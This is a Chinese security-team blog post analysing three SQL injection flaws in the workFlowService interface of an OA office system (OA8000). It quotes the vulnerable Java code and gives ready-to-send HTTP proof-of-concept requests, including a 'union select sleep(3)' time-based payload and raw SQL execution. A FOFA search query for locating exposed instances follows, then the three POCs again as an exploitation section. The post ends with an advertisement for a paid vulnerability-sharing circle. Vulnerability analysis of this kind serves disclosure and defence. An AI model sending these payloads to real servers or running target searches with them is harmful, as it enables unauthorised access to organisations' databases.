#  某天OA-workFlowService-多处SQL注入漏洞分析   
原创 chobits02  C4安全团队   2025-04-16 05:52  
  
![httpsu.wechat.comMMNIFu0mUhIchBxkan0Zozgs=1.png](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRPB8LAoicALgsdtxmen9tiasaAjJImJDkVXQV86YymyOYWfj3nicwJ11Jp7ySq1HjBazRjibFW7fEbWg/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "httpsu.wechat.comMMNIFu0mUhIchBxkan0Zozgs=1.png")  
  
**扫码加内部知识圈**  
  
获取漏洞资料  
  
  
  
本文章由团队成员[  
chobits02]授权转载并发布  
  
我们是C4安全团队  
，师傅们别忘了  
关注和  
点赞，团队的成长离不开你们★~  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJRMHW5Lcia7D8SyPHcEo2346iaQNwXlFK1JRKUiaaOwbnVSkXB9AnrHEsqC8icpdyYDMHAwTcyjL6rREA/640?wx_fmt=jpeg "")  
  
  
漏洞描述  
  
01  
  
某天OA系统是一个以技术领先著称的协同软件产品，具有极为突出的实用性、易用性和高性价比，实施简便，使用灵便。该系统workFlowService接口中存在多处SQL注入漏洞，恶意攻击者可以通过该漏洞获取数据库敏感信息或获取服务器权限。  
  
  
漏洞分析  
  
02  
  
OA系统较早版本中（<=2016版本）使用了已经停止更新的Buffalo-Ajax  
服务，通过Servlet的init过程初始化配置暴露给Buffalo远程调用的服务。该服务一般通过内置文件buffalo-service.properties  
进行配置。  
  
来到/WEB-INF/classes/buffalo-service.properties  
文件，查看workFlowService对应的包位置  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRMHW5Lcia7D8SyPHcEo2346QHvCv4mjXwoXD6Ub4uksqZCMiacQGXSD2kPLLTdiayc5gU2CUojPnZlA/640?wx_fmt=png&from=appmsg "")  
  
对应位置为  
  
com.oa8000.httrace.httrace01.manager.HtTrace01SqlProcess  
  
来到代码进行审计  
## SQL注入（一）  
  
接口中存在getAwokeListData方法如下  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRMHW5Lcia7D8SyPHcEo2346pr9liaibIFURa33on5iaWd5z0kIDBM0xxtFER7xILeFz3tFH3GtiaqBHgw/640?wx_fmt=png&from=appmsg "")  
  
关键代码中，读取了setStr参数并解析json内容。之后读取json中名称为k的参数对应的值，判断是否存在冒号分隔，存在则取冒号之前的为数据库源名称进行连接，冒号之后的作为查询的SQL语句；反之不存在则直接连接当前数据库，然后执行SQL语句  
```
publicList getAwokeListData(String setStr) {  
 if (setStr == null)  
  returnnew ArrayList();   
 String newSql = "";  
 String dbSourceName = "";  
    Connection con = null;  
    Statement smt = null;  
    ResultSet rs = null;  
    Session hiSession = null;  
    JSONObject jObject = JSONObject.fromObject(setStr);  
 String sql = jObject.getString("k");  
 String[] sqlAndSource = sql.split(":");  
 List&gt; list = new LinkedList();  
 if (sqlAndSource.length &gt; 1) {  
      dbSourceName = sqlAndSource[0];  
      newSql = sqlAndSource[1];  
    } else {  
      newSql = sqlAndSource[0];  
    }   
    hiSession = null;  
 boolean innerDbFlg = (dbSourceName == null || "".equals(dbSourceName));  
 try {  
      hiSession = TransactionManager.getInstance().getCurrentSession();  
  if (innerDbFlg) {  
        con = hiSession.connection();  
      } else {  
        con = (new HiOaBaseSQLManager(hiSession)).userOuterDbSource(dbSourceName);  
      }   
      smt = con.createStatement();  
      rs = smt.executeQuery(newSql);

```  
  
根据Buffalo-Ajax的请求格式，构造如下请求体，method中指定方法名称为getAwokeListData  
，参数为{"k":"SELECT database()","v":""}  
```
POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
Host:
Accept-Encoding: identity
Content-Length: 103
Accept-Language: zh-CN,zh;q=0.8
Accept: */*User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3Connection: keep-aliveCache-Control: max-age=0<buffalo-call>    <method>getAwokeListData</method>    <string>{"k":"SELECT database()","v":""}</string></buffalo-call>
```  
  
直接查询出数据库名称  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRMHW5Lcia7D8SyPHcEo2346he7Ck8IyjfKDskffjMfJicQ4xSMQ8AfIlrmQ5WiaITpcf8Pr4HprBTjQ/640?wx_fmt=png&from=appmsg "")  
## SQL注入（二）  
  
来看第二个SQL注入漏洞，也在该service中方法名称为getAfterUserID  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRMHW5Lcia7D8SyPHcEo2346fBF3PSa0MhnKtn68MpAQ5XFWQjPaOSjOCnbNCZsSW4K61Q6ic8SFhibg/640?wx_fmt=png&from=appmsg "")  
  
关键代码就是  
```
String sql = "SELECT user_id FROM user_user WHERE user_id in (" + tracedUsers + ",'" + userId + "') " + " order by user_order ";

```  
  
传参直接被拼接到SQL语句中执行，造成注入  
  
构造数据包如下，使用延时注入进行验证  
```
POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
Host: 
Accept-Encoding: identity
Content-Length: 103
Accept-Language: zh-CN,zh;q=0.8
Accept: */*User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3Connection: keep-aliveCache-Control: max-age=0<buffalo-call>    <method>getAfterUserID</method>    <string>1</string>    <string>1') union select sleep(3)#</string></buffalo-call>
```  
  
延时3秒  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRMHW5Lcia7D8SyPHcEo2346IY4t6mMvDz4Je85ICzhMUVsmcRItibTbZK2kmhRx39icWJAOniaiblCp6Q/640?wx_fmt=png&from=appmsg "")  
## SQL注入（三）  
  
来到最后一个方法，名称为getDataListForTree  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRMHW5Lcia7D8SyPHcEo2346CfakibicQ2ibCBCMSzrwIb4ibxBp5BKm0usZEiaPpD4oWXlqc8MzNulzTvg/640?wx_fmt=png&from=appmsg "")  
  
此处调用GetDatas方法，代码如下  
```
publicList getDatas(String sql) throws OaException {  
 if (sql == null || "".equals(sql))  
  returnnew ArrayList();   
    Session hiSession = null;  
 try {  
      hiSession = TransactionManager.getInstance().getCurrentSession();  
      HiOaBaseSQLManager event = new HiOaBaseSQLManager(hiSession);  
  return event.executeQuerySQL(sql);  
    } catch (Exception e) {  
      e.printStackTrace();  
  thrownew OaException(e.getMessage());  
    } finally {  
  if (hiSession != null)  
        hiSession.close();   
    }   
  }

```  
  
传参sql直接执行SQL语句查询，构造的请求体如下  
```
POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
Host: 
Accept-Encoding: identity
Content-Length: 103
Accept-Language: zh-CN,zh;q=0.8
Accept: */*User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3Connection: keep-aliveCache-Control: max-age=0<buffalo-call> <method>getDataListForTree</method> <string>select user()</string> </buffalo-call>
```  
  
直接查询获取结果  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRMHW5Lcia7D8SyPHcEo234634cSKukp1OECXhHn8dSiasTzVySSFx4bhc2xoljq8kxtk5B1WWBicN3A/640?wx_fmt=png&from=appmsg "")  
  
  
  
漏洞  
总结  
  
03  
  
这些SQL注入漏洞的形成原因，是代码中拼接SQL语句或未授权调用了数据库查询操作，最后造成能执行任意的恶意SQL语句。  
  
  
资产测绘  
  
01  
  
FOFA语法  
```
app="华天动力-OA8000"

```  
  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRMHW5Lcia7D8SyPHcEo2346ibKYDFD9bALZ1tJlN5jxS7EQKP8SVDsvapFW1zrhdCd7OfQIk4s3GZw/640?wx_fmt=png&from=appmsg "")  
  
  
  
漏洞利用  
  
01  
  
三个POC如下  
```
POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
Host:
Accept-Encoding: identity
Content-Length: 103
Accept-Language: zh-CN,zh;q=0.8
Accept: */*User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3Connection: keep-aliveCache-Control: max-age=0<buffalo-call>    <method>getAwokeListData</method>    <string>{"k":"SELECT database()","v":""}</string></buffalo-call>
```  
```
POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
Host: 
Accept-Encoding: identity
Content-Length: 103
Accept-Language: zh-CN,zh;q=0.8
Accept: */*User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3Connection: keep-aliveCache-Control: max-age=0<buffalo-call>    <method>getAfterUserID</method>    <string>1</string>    <string>1') union select sleep(3)#</string></buffalo-call>
```  
```
POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
Host: 
Accept-Encoding: identity
Content-Length: 103
Accept-Language: zh-CN,zh;q=0.8
Accept: */*User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3Connection: keep-aliveCache-Control: max-age=0<buffalo-call> <method>getDataListForTree</method> <string>select user()</string> </buffalo-call>
```  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/EXTCGqBpVJSiao22HdM7F7OBu4zNJicKjkysic7NSibpvLZNxicl3gia2AQgicckC6D0UmMgUvPYkMGUrVO11qVoiaN5UQ/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
内部圈子介绍  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJSiao22HdM7F7OBu4zNJicKjkh1aPOciaQusEdbRfFxibYX9MQUfcsgzH7DaD69vsgW2HgSiceoqqrongQ/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
圈子专注于更新  
SRC挖掘  
/代码审计  
相关：  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HaJr68L1tTTex7g7gA9hIFRAorxicicgGM4NFxNNVqAaFBL5ictHcaU9zf0zmhChIgNAvRrxUSV1l2FyI6ucawvXg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
**内部圈子**  
**专栏介绍**  
  
Freebuf知识大陆内部共享资料截屏详情如下  
  
（每周保持更新）  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJSiao22HdM7F7OBu4zNJicKjkzvdgfFtJotO7T8dD5ATKyyeuQibDwZoltOB3Uy5nRicGDxCEpwrlRYNg/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
**知识大陆——安全渗透感知大家族**  
****  
  
圈子券后现价 ￥49.9元  
  
如果你有兴趣加入，抓住机会不要犹豫，价格只会上涨，不会下跌  
  
圈子人数少于400人 49.9元/年  
  
圈子人数少于600人 69.9元/年  
  
（新人优惠券10，扫码或者私信开头二维码即可领取）  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSiao22HdM7F7OBu4zNJicKjkmbjBasHPFar7Cyrl5RBiawuiaks0DMFmHXODN0UkbaCnfMqtuLZicJXDw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
内部圈子——  
群  
友反馈  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJSiao22HdM7F7OBu4zNJicKjkZXuRl4vOBsaQwJK1AbsPcGMiczaPickCuIzicPiblfFjyjic3aeuzqVLLhg/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJSiao22HdM7F7OBu4zNJicKjkpxDWia5shmzQH4UialWGUCsoWYMHVpcEtUxF7RsfJaHKl9gsVWEjqAuw/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
团队公开交流群  
  
QQ群和微信群都已建立，方便常用QQ或微信的师傅加入团队公开交流群，交流各类网安、实战方面的问题~  
  
（微信群①群已满200人，需要邀请加开头运营二维码才能加入，②群如下）  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJRMHW5Lcia7D8SyPHcEo2346tHn1qDJUnOLtHQra3RWYUAUticI856u1y9yvwxRehJbbTlSXU3XpH1g/640?wx_fmt=jpeg&from=appmsg "")  
  
  
